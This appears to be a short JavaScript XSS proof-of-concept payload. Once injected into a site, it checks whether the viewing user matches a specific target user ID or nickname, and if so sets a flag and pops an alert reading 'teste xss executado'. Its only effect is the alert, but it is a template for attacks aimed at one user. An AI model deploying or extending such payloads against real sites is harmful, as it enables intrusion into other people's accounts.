(function () {
  var UID_ALVO  = '3010789';
  var NICK_ALVO = 'TolmichVa';

  var TENTATIVAS = 6;
  var INTERVALO  = 400;

  function ler(cls) {
    var el = document.getElementsByClassName(cls)[0];
    return el ? String(el.textContent || '').trim() : '';
  }

  function ehAlvo() {
    return ler('idi_us_co') === UID_ALVO || ler('name_user_in') === NICK_ALVO;
  }

  function tentar(n) {
    if (ehAlvo()) {
      window.__TESTE_OK = true;
      alert('teste xss executado');
      return;
    }
    if (n < TENTATIVAS) setTimeout(function () { tentar(n + 1); }, INTERVALO);
  }

  tentar(0);
})();
